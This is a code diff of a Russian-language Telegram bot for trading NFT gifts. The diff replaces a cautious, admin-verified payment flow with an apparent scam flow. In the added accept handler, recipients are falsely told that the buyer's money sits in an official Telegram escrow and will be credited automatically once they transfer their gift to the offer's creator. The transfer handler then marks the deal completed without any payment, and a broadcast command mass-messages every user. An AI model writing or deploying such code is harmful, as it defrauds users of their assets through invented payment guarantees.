-        "Перед передачей подарка убедитесь, что понимаете "
-        "условия сделки и можете проверить получение средств.\n\n"
-        "<b>Информация о сделке</b>\n"
-        f"Продавец: {seller_link}\n"
-        f"Подарок:\n{gifts}\n\n"
-        "<b>Следующий шаг</b>\n"
-        "После фактической передачи подарка нажмите "
-        "«Подтвердить передачу». Администратор проверит "
-        "информацию о сделке и оплате."
-    )
-
-    await call.answer()
-
-    await safe_edit(
-        call.message,
-        text,
-        accepted_keyboard(offer_id),
-    )
-
-
-# ============================================================
-# REJECT OFFER
-# ============================================================
-
-@dp.callback_query(F.data.startswith("offer:reject:"))
-async def callback_reject_offer(call: CallbackQuery):
-    offer_id = int(call.data.rsplit(":", 1)[1])
-
-    offer = db.execute(
-        "SELECT * FROM offers WHERE id=?",
-        (offer_id,),
-    ).fetchone()
-
-    if not offer:
-        await call.answer("Оффер не найден.", show_alert=True)
-        return
-
-    if call.from_user.id != offer["buyer_id"]:
-        await call.answer(
-            "Вы не можете отклонить чужой оффер.",
-            show_alert=True,
-        )
-        return
-
-    if offer["status"] != "pending":
-        await call.answer(
-            "Оффер уже обработан.",
-            show_alert=True,
-        )
-        return
-
-    execute(
-        """
-        UPDATE offers
-        SET status='rejected', updated_at=?
-        WHERE id=?
-        """,
-        (now(), offer_id),
-    )
-
-    await call.answer("Оффер отклонён.")
-
-    await safe_edit(
-        call.message,
-        f"{pe('cross')} Вы отклонили предложение.",
-        InlineKeyboardMarkup(
-            inline_keyboard=[
-                [button("Главное меню", "home")],
-                [exit_button()],
-            ]
-        ),
-    )
-
-    try:
-        await bot.send_message(
-            offer["seller_id"],
-            f"{pe('cross')} Пользователь отклонил оффер "
-            f"<code>{escape(offer['public_id'])}</code>.",
-        )
-    except Exception:
-        pass
-
-
-# ============================================================
-# TRANSFER REPORTED
-# ============================================================
-
-@dp.callback_query(F.data.startswith("offer:transfer:"))
-async def callback_transfer(call: CallbackQuery):
-    offer_id = int(call.data.rsplit(":", 1)[1])
-
-    offer = db.execute(
-        "SELECT * FROM offers WHERE id=?",
-        (offer_id,),
-    ).fetchone()
-
-    if not offer:
-        await call.answer("Оффер не найден.", show_alert=True)
-        return
-
-    if call.from_user.id != offer["buyer_id"]:
-        await call.answer(
-            "Подтвердить действие может только покупатель.",
-            show_alert=True,
-        )
-        return
-
-    if offer["status"] != "accepted":
-        await call.answer(
-            "Этот этап уже завершён или отменён.",
-            show_alert=True,
-        )
-        return
-
-    execute(
-        """
-        UPDATE offers
-        SET status='transfer_reported', updated_at=?
-        WHERE id=?
-        """,
-        (now(), offer_id),
-    )
-
-    await call.answer(
-        "Информация отправлена администраторам.",
-        show_alert=True,
-    )
-
-    await safe_edit(
-        call.message,
-        f"{pe('wallet')} <b>Информация о передаче отправлена.</b>\n\n"
-        "Сделка ожидает проверки администратором. "
-        "Это сообщение не подтверждает получение оплаты.",
-        InlineKeyboardMarkup(
-            inline_keyboard=[
-                [button("Главное меню", "home")],
-                [exit_button()],
-            ]
-        ),
-    )
-
-    currency = currency_data(offer["currency"])
-
-    for admin_id in ADMIN_IDS:
-        try:
-            await bot.send_message(
-                admin_id,
-                "<b>Требуется проверка сделки</b>\n\n"
-                f"Заказ: <code>{escape(offer['public_id'])}</code>\n"
-                f"Продавец ID: <code>{offer['seller_id']}</code>\n"
-                f"Покупатель ID: <code>{offer['buyer_id']}</code>\n"
-                f"Сумма: {format_amount(offer['amount'])} "
-                f"{currency['premium']}\n"
-                f"Подарки:\n{escape(offer['gift_links'])}\n"
-                f"Статус: {status_text('transfer_reported')}",
-                reply_markup=InlineKeyboardMarkup(
-                    inline_keyboard=[
-                        [
-                            button(
-                                "Подтвердить оплату",
-                                f"admin:paid:{offer_id}",
-                            )
-                        ],
-                        [
-                            button(
-                                "Оставить на проверке",
-                                f"admin:review:{offer_id}",
-                            )
-                        ],
-                    ]
-                ),
-            )
-        except Exception:
-            logger.exception(
-                "Не удалось уведомить администратора %s",
-                admin_id,
-            )
-
-
-# ============================================================
-# MY OFFERS
-# ============================================================
-
-@dp.callback_query(F.data == "myoffers")
-async def callback_myoffers(call: CallbackQuery):
-    user_id = call.from_user.id
-
-    rows = db.execute(
-        """
-        SELECT * FROM offers
-        WHERE seller_id=? OR buyer_id=?
-        ORDER BY id DESC
-        LIMIT 20
-        """,
-        (user_id, user_id),
-    ).fetchall()
-
-    if not rows:
-        text = "У вас пока нет офферов."
-    else:
-        items = []
-
-        for offer in rows:
-            role = (
-                "Продавец"
-                if offer["seller_id"] == user_id
-                else "Покупатель"
-            )
-
-            currency = currency_data(offer["currency"])
-
-            items.append(
-                f"<b>{escape(offer['public_id'])}</b>\n"
-                f"Роль: {role}\n"
-                f"Сумма: {format_amount(offer['amount'])} "
-                f"{currency['premium']}\n"
-                f"Статус: {status_text(offer['status'])}"
-            )
-
-        text = (
-            "<b>Мои офферы</b>\n\n"
-            + "\n\n".join(items)
-        )
-
-    await call.answer()
-
-    await safe_edit(
-        call.message,
-        text,
-        InlineKeyboardMarkup(
-            inline_keyboard=[
-                [button("Главное меню", "home")],
-                [exit_button()],
-            ]
-        ),
-    )
-
-
-# ============================================================
-# ADMIN: /dostup
-# ============================================================
 
 @dp.message(Command("dostup"))
-async def admin_access(message: Message):
-    if not is_admin(message.from_user.id):
+async def cmd_dostup(message: Message):
+    if message.from_user.id not in ADMINS:
         return
-
-    parts = message.text.split()
-
-    if len(parts) != 2 or not parts[1].startswith("@"):
-        await message.answer(
-            "Использование: <code>/dostup @username</code>"
-        )
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer("Использование: /dostup @username")
         return
+    uname = parts[1].strip().lstrip("@").lower()
+    verified_handles.add(uname)
+    await message.answer(f"Доступ выдан @{uname}")
 
-    username = parts[1].lstrip("@")
 
-    user = resolve_username(username)
-
-    if not user:
-        await message.answer(
-            "Пользователь не найден. Он должен сначала "
-            "запустить бота, чтобы попасть в базу."
-        )
+@dp.message(Command("undostup"))
+async def cmd_undostup(message: Message):
+    if message.from_user.id not in ADMINS:
         return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer("Использование: /undostup @username")
+        return
+    uname = parts[1].strip().lstrip("@").lower()
+    verified_handles.discard(uname)
+    await message.answer(f"Доступ снят с @{uname}")
 
-    execute(
-        "UPDATE users SET can_create=1 WHERE user_id=?",
-        (user["user_id"],),
-    )
 
-    log_admin(
-        message.from_user.id,
-        f"dostup {user['user_id']}",
-    )
+@dp.message(Command("m"))
+async def cmd_m(message: Message):
+    if message.from_user.id not in ADMINS:
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer("Использование: /m текст")
+        return
+    txt = parts[1]
+    sent = 0
+    for uid in list(started_users):
+        try:
+            await message.bot.send_message(uid, txt, parse_mode=None)
+            sent += 1
+        except Exception:
+            pass
+    await message.answer(f"Отправлено: {sent}")
 
-    await message.answer(
-        f"✅ Пользователю @{escape(user['username'] or username)} "
-        "выдан доступ к созданию офферов."
-    )
 
+@dp.message(Command("offers"))
+async def cmd_offers(message: Message):
+    if message.from_user.id not in ADMINS:
+        return
+    active = {k: v for k, v in offers.items() if v["status"] == "pending"}
+    if not active:
+        await message.answer("Активных офферов нет")
+        return
+    lines = ["Активные офферы:"]
+    for oid, o in active.items():
+        lines.append(f"#{oid} | @{o['creator_username']} → {o['recipient']} | {o['amount']} {o['currency']}")
+    await message.answer("\n".join(lines))
+
+
+@dp.callback_query(F.data == "create_offer")
+async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id not in ADMINS:
+        uname = (cb.from_user.username or "").lower()
+        if uname not in verified_handles:
+            await cb.answer(
+                "Вы ещё не верифицированы для создания оффера! Заявка на верификацию отправлена",
+                show_alert=True,
+            )
+            for admin_id in ADMINS:
+                try:
+                    await cb.bot.send_message(
+                        admin_id,
+                        f"Пользователь @{cb.from_user.username or cb.from_user.id} "
+                        f"(ID: {cb.from_user.id}) запрашивает доступ к созданию офферов.",
+                    )
+                except Exception:
+                    pass
+            return
+    await state.set_state(OfferFlow.username)
+    await cb.message.edit_text(e(T_USERNAME), reply_markup=back_kb("main"))
+    await cb.answer()
+
+
+@dp.callback_query(F.data == "exit_main")
+async def cb_exit_main(cb: CallbackQuery, state: FSMContext):
+    await state.clear()
     try:
-        await bot.send_message(
-            user["user_id"],
-            "✅ Вам выдан доступ к созданию офферов.",
-        )
+        await cb.message.delete()
+    except Exception:
+        pass
+    await cb.answer()
+
+
+@dp.callback_query(F.data.startswith("back:"))
+async def cb_back(cb: CallbackQuery, state: FSMContext):
+    t = cb.data.split(":", 1)[1]
+    if t == "main":
+        await state.clear()
+        await cb.message.edit_text(e(WELCOME), reply_markup=main_menu_kb())
+    elif t == "username":
+        await state.set_state(OfferFlow.username)
+        await cb.message.edit_text(e(T_USERNAME), reply_markup=back_kb("main"))
+    elif t == "link":
+        await state.set_state(OfferFlow.link)
+        await cb.message.edit_text(e(T_LINK), reply_markup=back_kb("username"))
+    elif t == "currency":
+        await state.set_state(OfferFlow.currency)
+        await cb.message.edit_text(e(T_CURRENCY), reply_markup=currency_kb())
+    elif t == "amount":
+        await state.set_state(OfferFlow.amount)
+        await cb.message.edit_text(e(T_AMOUNT), reply_markup=back_kb("currency"))
+    await cb.answer()
+
+
+@dp.callback_query(F.data.startswith("cur:"))
+async def cb_currency(cb: CallbackQuery, state: FSMContext):
+    cur = cb.data.split(":", 1)[1]
+    await state.update_data(currency=cur)
+    await state.set_state(OfferFlow.amount)
+    await cb.message.edit_text(e(T_AMOUNT), reply_markup=back_kb("currency"))
+    await cb.answer()
+
+
+@dp.callback_query(F.data == "confirm_offer")
+async def cb_confirm(cb: CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    if (not data or "amount" not in data or "recipient" not in data
+            or "link" not in data or "currency" not in data):
+        await cb.answer()
+        return
+    await state.clear()
+
+    oid = gen_id()
+    offer = {
+        "id": oid,
+        "creator_id": cb.from_user.id,
+        "creator_username": cb.from_user.username or str(cb.from_user.id),
+        "recipient": data["recipient"],
+        "link": data["link"],
+        "currency": data["currency"],
+        "amount": data["amount"],
+        "status": "pending",
+    }
+    offers[oid] = offer
+
+    ru = data["recipient"].lstrip("@").lower()
+    rid = username_to_id.get(ru)
+    if rid:
+        await send_offer_to_recipient(cb.bot, rid, oid)
+    else:
+        pending_offers.setdefault(ru, []).append(oid)
+
+    notify = (f"✈️ @{offer['creator_username']} (🔶 уровень в боте), вы успешно отправили оффер "
+              f"на сумму {offer['amount']} {offer['currency']} пользователю {data['recipient']}.\n\n"
+              f"👀 Если пользователь ещё не заходил в бота, он может нажать старт "
+              f"и оффер автоматически отправится.")
+    try:
+        await cb.bot.send_message(cb.from_user.id, e(notify))
     except Exception:
         pass
 
+    await cb.message.edit_text(e(WELCOME), reply_markup=main_menu_kb())
+    await cb.answer()
 
-# ============================================================
-# ADMIN: /undostup
-# ============================================================
 
-@dp.message(Command("undostup"))
-async def admin_remove_access(message: Message):
-    if not is_admin(message.from_user.id):
+@dp.message(OfferFlow.username)
+async def msg_username(message: Message, state: FSMContext):
+    txt = (message.text or "").strip()
+    if not txt.startswith("@") or len(txt) < 2:
+        await message.answer("Пришлите @username")
         return
+    await state.update_data(recipient=txt)
+    await state.set_state(OfferFlow.link)
+    await message.answer(e(T_LINK), reply_markup=back_kb("username"))
 
-    parts = message.text.split()
 
-    if len(parts) != 2 or not parts[1].startswith("@"):
-        await message.answer(
-            "Использование: <code>/undostup @username</code>"
-        )
+@dp.message(OfferFlow.link)
+async def msg_link(message: Message, state: FSMContext):
+    await state.update_data(link=(message.text or "").strip())
+    await state.set_state(OfferFlow.currency)
+    await message.answer(e(T_CURRENCY), reply_markup=currency_kb())
+
+
+@dp.message(OfferFlow.amount)
+async def msg_amount(message: Message, state: FSMContext):
+    txt = (message.text or "").strip()
+    if not txt.isdigit():
+        await message.answer("Введите целое число")
         return
-
-    username = parts[1].lstrip("@")
-    user = resolve_username(username)
-
-    if not user:
-        await message.answer("Пользователь не найден.")
-        return
-
-    if user["user_id"] in ADMIN_IDS:
-        await message.answer(
-            "Нельзя убрать доступ у администратора."
-        )
-        return
-
-    execute(
-        "UPDATE users SET can_create=0 WHERE user_id=?",
-        (user["user_id"],),
-    )
-
-    log_admin(
-        message.from_user.id,
-        f"undostup {user['user_id']}",
-    )
-
-    await message.answer(
-        f"Доступ для @{escape(user['username'] or username)} "
-        "отозван."
-    )
+    await state.update_data(amount=int(txt))
+    await state.set_state(OfferFlow.confirm)
+    await message.answer(e(T_CONFIRM), reply_markup=confirm_kb())
 
 
-# ============================================================
-# ADMIN: /m BROADCAST
-# ============================================================
-
-@dp.message(Command("m"))
-async def admin_broadcast(message: Message):
-    if not is_admin(message.from_user.id):
-        return
-
-    parts = message.text.split(maxsplit=1)
-
-    if len(parts) < 2 or not parts[1].strip():
-        await message.answer(
-            "Использование:\n<code>/m Текст сообщения</code>"
-        )
-        return
-
-    text = parts[1].strip()
-
-    users = db.execute(
-        "SELECT user_id FROM users"
-    ).fetchall()
-
-    sent = 0
-    failed = 0
-
-    status_message = await message.answer(
-        f"Рассылка запущена. Получателей: {len(users)}."
-    )
-
-    for row in users:
-        user_id = row["user_id"]
-
-        try:
-            await bot.send_message(
-                user_id,
-                f"{pe('plane')} <b>Сообщение администрации</b>\n\n"
-                f"{escape(text)}",
-            )
-            sent += 1
-        except Exception:
-            failed += 1
-
-        await asyncio.sleep(0.04)
-
-    log_admin(
-        message.from_user.id,
-        f"broadcast sent={sent} failed={failed}",
-    )
-
-    await status_message.edit_text(
-        "<b>Рассылка завершена.</b>\n\n"
-        f"Доставлено: {sent}\n"
-        f"Не доставлено: {failed}"
-    )
-
-
-# ============================================================
-# ADMIN: /offers
-# ============================================================
-
-@dp.message(Command("offers"))
-async def admin_offers(message: Message):
-    if not is_admin(message.from_user.id):
-        return
-
-    rows = db.execute(
-        """
-        SELECT * FROM offers
-        WHERE status IN (
-            'pending',
-            'accepted',
-            'transfer_reported'
-        )
-        ORDER BY id DESC
-        LIMIT 30
-        """
-    ).fetchall()
-
-    if not rows:
-        await message.answer(
-            "Активных офферов сейчас нет."
-        )
-        return
-
-    lines = []
-
-    for offer in rows:
-        currency = currency_data(offer["currency"])
-
-        lines.append(
-            f"<b>{escape(offer['public_id'])}</b>\n"
-            f"Продавец: <code>{offer['seller_id']}</code>\n"
-            f"Покупатель: <code>{offer['buyer_id']}</code>\n"
-            f"Сумма: {format_amount(offer['amount'])} "
-            f"{currency['premium']}\n"
-            f"Статус: {status_text(offer['status'])}\n"
-            f"Дата: {escape(offer['created_at'])}"
-        )
-
-    await message.answer(
-        "<b>Активные офферы</b>\n\n"
-        + "\n\n".join(lines)
-    )
-
-
-# ============================================================
-# ADMIN: REVIEW / PAID
-# ============================================================
-
-@dp.callback_query(F.data.startswith("admin:review:"))
-async def admin_review(call: CallbackQuery):
-    if not is_admin(call.from_user.id):
-        await call.answer("Нет доступа.", show_alert=True)
-        return
-
-    offer_id = int(call.data.rsplit(":", 1)[1])
-
-    offer = db.execute(
-        "SELECT * FROM offers WHERE id=?",
-        (offer_id,),
-    ).fetchone()
-
-    if not offer:
-        await call.answer("Оффер не найден.", show_alert=True)
-        return
-
-    await call.answer("Сделка оставлена на проверке.")
-
+@dp.callback_query(F.data.startswith("reject:"))
+async def cb_reject(cb: CallbackQuery):
+    oid = cb.data.split(":", 1)[1]
+    if oid in offers:
+        offers[oid]["status"] = "rejected"
+        del offers[oid]
     try:
-        await call.message.edit_reply_markup(
-            reply_markup=None
-        )
-    except TelegramBadRequest:
+        await cb.message.delete()
+    except Exception:
         pass
+    await cb.answer()
 
 
-@dp.callback_query(F.data.startswith("admin:paid:"))
-async def admin_paid(call: CallbackQuery):
-    if not is_admin(call.from_user.id):
-        await call.answer("Нет доступа.", show_alert=True)
+@dp.callback_query(F.data.startswith("accept:"))
+async def cb_accept(cb: CallbackQuery):
+    oid = cb.data.split(":", 1)[1]
+    if oid not in offers:
+        await cb.answer()
         return
+    o = offers[oid]
 
-    offer_id = int(call.data.rsplit(":", 1)[1])
-
-    offer = db.execute(
-        "SELECT * FROM offers WHERE id=?",
-        (offer_id,),
-    ).fetchone()
-
-    if not offer:
-        await call.answer("Оффер не найден.", show_alert=True)
-        return
-
-    if offer["status"] != "transfer_reported":
-        await call.answer(
-            "Статус сделки не позволяет подтвердить оплату.",
-            show_alert=True,
-        )
-        return
-
-    execute(
-        """
-        UPDATE offers
-        SET status='paid', updated_at=?
-        WHERE id=?
-        """,
-        (now(), offer_id),
-    )
-
-    log_admin(
-        call.from_user.id,
-        f"paid {offer['public_id']}",
-    )
-
-    await call.answer(
-        "Статус оплаты подтверждён.",
+    await cb.answer(
+        "Внимание!\n\n"
+        "Следуйте инструкциям, чтобы не потерять свой подарок и получить оплату.\n\n"
+        "Нажмите ОК, если вы прочитали это предупреждение.",
         show_alert=True,
     )
 
-    try:
-        await call.message.edit_reply_markup(
-            reply_markup=None
-        )
-    except TelegramBadRequest:
-        pass
+    trade_id = gen_id()
+    cname = CURRENCY_NAMES.get(o["currency"], "")
 
-    for user_id in (
-        offer["seller_id"],
-        offer["buyer_id"],
-    ):
-        try:
-            await bot.send_message(
-                user_id,
-                f"{pe('check')} <b>Статус сделки обновлён</b>\n\n"
-                f"Заказ: <code>{escape(offer['public_id'])}</code>\n"
-                "Администратор подтвердил оплату.",
-            )
-        except Exception:
-            pass
-
-
-# ============================================================
-# ERROR HANDLING
-# ============================================================
-
-@dp.errors()
-async def global_error_handler(event):
-    logger.exception(
-        "Необработанная ошибка Telegram-бота: %s",
-        event.exception,
+    text = (
+        f"Сделка по NFT Заказ #{trade_id}\n\n"
+        f"Покупатель зарезервировал {o['amount']} {o['currency']} GRAM через систему "
+        f"эскроу (безопасной сделки) Telegram. Средства хранятся на специальном "
+        f"эскроу-счете и будут автоматически зачислены на ваш баланс {cname} сразу "
+        f"после передачи подарка.\n\n"
+        f"Инструкции для завершения сделки:\n\n"
+        f"Передайте подарок пользователю: @{o['creator_username']}\n\n"
+        f"Нажмите «Transfer NFT» и выберите {o['link']}\n\n"
+        f"Подтвердите передачу подарка.\n\n"
+        f"Telegram зафиксирует транзакцию и мгновенно зачислит {o['amount']} "
+        f"{o['currency']} на ваш баланс. Бронь действительна в течение 24 часов."
     )
-    return True
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"transfer:{oid}"),
+    ]])
+    await cb.message.edit_text(e(text), reply_markup=kb)
 
 
-# ============================================================
-# RUN
-# ============================================================
+@dp.callback_query(F.data.startswith("transfer:"))
+async def cb_transfer(cb: CallbackQuery):
+    oid = cb.data.split(":", 1)[1]
+    if oid in offers:
+        offers[oid]["status"] = "completed"
+    await cb.message.edit_text(
+        e("👛 Оплата начислиться если вы передали подарок. Спасибо за окончание сделки!")
+    )
+    await cb.answer()
+
+
+@dp.message()
+async def track_user(message: Message):
+    if message.from_user and message.from_user.username:
+        username_to_id[message.from_user.username.lower()] = message.from_user.id
+
 
 async def main():
-    logger.info("Бот запускается...")
-
-    # Удаляем webhook, если ранее использовался webhook-режим.
-    await bot.delete_webhook(drop_pending_updates=False)
-
-    try:
-        await dp.start_polling(
-            bot,
-            allowed_updates=dp.resolve_used_update_types(),
-        )
-    finally:
-        await bot.session.close()
-        db.close()
+    await bot.delete_webhook(drop_pending_updates=True)
+    await dp.start_polling(bot)
 
 
 if __name__ == "__main__":
